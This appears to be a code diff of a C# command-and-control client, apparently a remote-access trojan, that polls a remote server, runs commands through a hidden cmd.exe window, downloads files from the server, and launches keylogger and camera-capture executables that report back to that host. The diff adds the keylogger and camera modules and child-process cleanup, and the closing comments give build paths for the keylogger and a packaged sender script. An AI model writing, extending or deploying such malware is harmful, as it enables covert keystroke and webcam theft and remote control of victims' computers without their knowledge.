@@ -1,18 +1,20 @@
 ﻿using System.Diagnostics;
+using System.Management;
 
 namespace C2
 {
     class Program
     {
         private static string requestResult = string.Empty;
-        private static Uri url = new Uri("https://malwinator.chickenkiller.com");
-        //private static Uri url = new Uri("http://malwinator.chickenkiller.com");
-        //private static Uri url = new Uri("http://localhost:8088");
-        private static string machineName = Environment.MachineName;
-        private static string username = Environment.UserName;
-        private static string filePath = "C:\\Users\\" + username + "\\Downloads\\";
+        //private static Uri url = new Uri("https://malwinator.chickenkiller.com");
+        private static Uri url = new Uri("http://malwinator.chickenkiller.com");
+        //private static Uri url = new Uri("http://localhost:5000");
+        //private static Uri url = new Uri("http://10.11.97.215:5000");
+        private static string machineName = Environment.MachineName; 
         private static Process process = new Process();
         private static string processName = string.Empty;
+        private static string keyloggerPath = string.Empty;
+        private static string cameraPath = string.Empty;
 
         // adding the post data to the request (name=machineName)
         private static KeyValuePair<string, string> machineNameFormData = new KeyValuePair<string, string>("name", machineName);
@@ -21,6 +23,7 @@ namespace C2
 
         static void Main(string[] argv)
         {
+            
             server.Timeout = TimeSpan.FromDays(1);
 
             while (true)
@@ -75,54 +78,198 @@ namespace C2
                     break;
 
                 case "download":
-                    KeyValuePair<string, string> fileFormData = new KeyValuePair<string, string>("file", args[1]);
+                    int skipped = 1;
+                    string moduleFlag = args.Skip(skipped).First();
+                    string resetFlag = args.Skip(skipped + 1).First();
+                    string status = string.Empty;
 
-                    using (HttpResponseMessage response = server.PostAsync(url + "/download", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { fileFormData })).Result)
+                    if (moduleFlag[0] == '-')
                     {
-                        // Check if the request was successful
-                        if (response.IsSuccessStatusCode)
-                        {
-                            // Save the file content to a local file
-                            using (FileStream fileStream = new FileStream(filePath + args[1], FileMode.Create))
-                            {
-                                await response.Content.CopyToAsync(fileStream);
-                            }
+                        skipped++;
 
-                            Console.WriteLine($"[+] File downloaded successfully: {filePath}");
-                        }
-                        else
-                        {
-                            // Display the status code and reason phrase
-                            Console.WriteLine($"[X] Failed to download file: {response.StatusCode} {response.ReasonPhrase}");
-                        }
-
+                        if (resetFlag[0] == '-')
+                            skipped++;
                     }
+
+                    string[] files = string.Join(" ", args.Skip(skipped)).Split("\"")
+                        .Where(s => !string.IsNullOrWhiteSpace(s)).ToArray();
+
+                    string fullPath = string.Empty;
+                    
+                    if (files.Length == 1)
+                        fullPath = files[0];
+                    else
+                        fullPath = files[1] + "\\" + files[0];
+
+                    Console.WriteLine(fullPath);
+
+                    if (moduleFlag == "-k")
+                    {
+                        keyloggerPath = fullPath;
+                        status = $"Keylogger uploaded at: {keyloggerPath}";
+                        Console.WriteLine(status);
+                    }
+                    else if (moduleFlag == "-c")
+                    {
+                        cameraPath = fullPath;
+                        status = $"Camera uploaded at: {cameraPath}";
+                        Console.WriteLine(status);
+                    }
+
+
+                    if (skipped != 3)
+                    {
+                        // this is were the file get's downloaded
+                        KeyValuePair<string, string> fileFormData = new KeyValuePair<string, string>("file", files[0]);
+
+                        using (HttpResponseMessage response = server.PostAsync(url + "/download", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { fileFormData })).Result)
+                        {
+                            
+
+                            // Check if the request was successful
+                            if (response.IsSuccessStatusCode)
+                            {
+                                // Save the file content to a local file
+                                try
+                                {
+                                    using (FileStream fileStream = new FileStream(fullPath, FileMode.Create))
+                                    {
+                                        if (fileStream.CanWrite)
+                                        {
+                                            await response.Content.CopyToAsync(fileStream);
+                                            status = "File uploaded successfully! Path: " + fullPath;
+                                        }
+                                        else
+                                        {
+                                            status = $"Failed to download file: Cannot write to location.";
+                                        }
+                                
+                                    }
+                                }
+                                catch (Exception ex)
+                                {
+                                    status = $"Failed to download filed: {ex.Message}";
+                                }
+
+                            }
+                            else
+                            {
+                                // Display the status code and reason phrase
+                                status = $"Failed to download file: {response.StatusCode} {response.ReasonPhrase}";
+                                Console.WriteLine($"[X] Failed to download file: {response.StatusCode} {response.ReasonPhrase}");
+                            }
+                        }
+                    }
+
+                    KeyValuePair<string, string> fileDownloadResult = new KeyValuePair<string, string>("result", status);
+                    HttpResponseMessage r = server.PostAsync(url + "/result", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { fileDownloadResult, machineNameFormData })).Result;
+                    await Console.Out.WriteLineAsync(r.Content.ToString());
 
                     break;
 
                 case "log":
-                    if (!processName.Equals(string.Empty))
-                    {
-                        Console.WriteLine("[!] Process already started!");
-                        return;
-                    }
-                    process.StartInfo.FileName = "C:\\Users\\" + username + "\\Downloads\\MyConsoleApp.exe"; // Path to the keylogger executable file
-                    process.StartInfo.Arguments = url.ToString(); // Command-line arguments
+                    string message = string.Empty;
 
                     // Start the process
-                    process.Start();
-                    Console.WriteLine($"[+] Process started! PID: {process.Id}");
-                    processName = "keylogger";
+                    try
+                    {
+
+                        if (!processName.Equals(string.Empty))
+                        {
+                            Console.WriteLine("[!] Process already started! " + "(" + processName + ")");
+                            throw new Exception($"Process already started! ({processName})");
+                        }
+
+                        // this post request is to clear the log buffer from the server
+                        await server.PostAsync(url + "/clearLog", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { machineNameFormData }));
+
+                        if (!File.Exists(keyloggerPath))
+                        {
+                            Console.WriteLine("[!] File not provided for keylogger!");
+                            throw new Exception("File not provided for keylogger!");
+                        }
+                        process.StartInfo.FileName = keyloggerPath; // Path to the keylogger executable file
+                        process.StartInfo.Arguments = url.ToString(); // Command-line arguments
+
+
+                        if (process.Start())
+                        {
+                            // the process should start and send a success response to the server
+                            Console.WriteLine($"[+] Process started! PID: {process.Id}");
+                            message = "Process started!\n";
+                            processName = "keylogger";
+                        }
+                        else
+                            throw new Exception("Process could not be started!"); // error is thrown to be cought 
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine($"Error: {e.Message}");
+                        message = $"Error: {e.Message}";
+                    }
+                    
+                    // here the client should send a fail response to the server
+                    await server.PostAsync(url + "/log", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> {
+                        machineNameFormData,
+                        new KeyValuePair<string, string>("key", '\n' + message + '\n')
+                     }));
                     break;
 
 
-                case "end-log":
-                    if (processName == "keylogger")
+                case "camera":
+
+                    if (!processName.Equals(string.Empty))
                     {
-                        process.Kill();
-                        Console.WriteLine($"[+] Process {process.Id} killed!");
-                        processName = string.Empty;
+                        Console.WriteLine("[!] Process already started! " + "(" + processName + ")");
+                        return;
                     }
+
+                    if (!File.Exists(cameraPath))
+                    {
+                        Console.WriteLine("[!] File not provided for camera!");
+                        return;
+                    }
+                    process.StartInfo.FileName = cameraPath; // Path to the keylogger executable file
+                    process.StartInfo.Arguments = url.ToString(); // Command-line arguments
+
+
+                    if (process.Start())
+                    {
+                        // the process should start and send a success response to the server
+                        Console.WriteLine($"[+] Process started! PID: {process.Id}");
+                        message = "Process started!\n";
+                        processName = "camera";
+                    }
+
+                    break;
+
+                case "end":
+
+                    if (args[1] == "log")
+                    {
+                        if (processName == "keylogger")
+                        {
+                            process.Kill();
+                            Console.WriteLine($"[+] Process {process.Id} killed!");
+                            processName = string.Empty;
+                        }
+
+                    }
+                    else if (args[1] == "camera")
+                    {
+                        if (processName == "camera")
+                        {
+                            TerminateProcessAndChildren(process);
+                            
+                            Console.WriteLine($"[+] Process {process.Id} killed!");
+                            processName = string.Empty;
+                        }
+                    }
+                    else if (args[1] == "connection")
+                    {
+                        Environment.Exit(0);
+                    }
+
                     break;
 
 
@@ -147,12 +294,12 @@ namespace C2
         {
             ProcessStartInfo startInfo = new ProcessStartInfo
             {
-                FileName = "cmd.exe",  
-                Arguments = $"/C \"{command}\"",  
-                RedirectStandardOutput = true, 
+                FileName = "cmd.exe",
+                Arguments = $"/C \"{command}\"",
+                RedirectStandardOutput = true,
                 RedirectStandardError = true,
-                UseShellExecute = false,  
-                CreateNoWindow = true 
+                UseShellExecute = false,
+                CreateNoWindow = true
             };
 
             Process process = new Process
@@ -173,9 +320,62 @@ namespace C2
             else
                 return err;
         }
+
+        static void TerminateProcessAndChildren(Process parent)
+        {
+            // Retrieve all child processes of the main process
+            List<Process> children = GetChildProcesses(parent);
+
+            // Terminate all child processes recursively
+            foreach (Process child in children)
+            {
+                TerminateProcessAndChildren(child);
+            }
+
+            // Kill the main process
+            parent.Kill();
+        }
+
+        static List<Process> GetChildProcesses(Process parent)
+        {
+            List<Process> children = new List<Process>();
+
+            // Get all processes running on the system
+            Process[] allProcesses = Process.GetProcesses();
+
+            // Find child processes of the main process
+            foreach (Process process in allProcesses)
+            {
+                // Check if the parent process ID of the process matches the main process ID
+                if (GetParentProcessId(process) == parent.Id)
+                {
+                    children.Add(process);
+                }
+            }
+
+            return children;
+        }
+
+        static int GetParentProcessId(Process process)
+        {
+            try
+            {
+                using (ManagementObject mo = new ManagementObject("win32_process.handle='" + process.Id + "'"))
+                {
+                    mo.Get();
+                    return Convert.ToInt32(mo["ParentProcessId"]);
+                }
+            }
+            catch
+            {
+                return -1; // Return -1 if unable to get the parent process ID
+            }
+        }
     }
 }
 
 // useful commands
 // dotnet publish -c Release
 // executable path: bin\Release\net8.0\win-x64\publish\
+// C:\Users\vlads\Downloads\keylogger.exe
+// C:\Users\vlads\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0\LocalCache\local-packages\Python312\Scripts\pyinstaller.exe --onefile .\sender.py
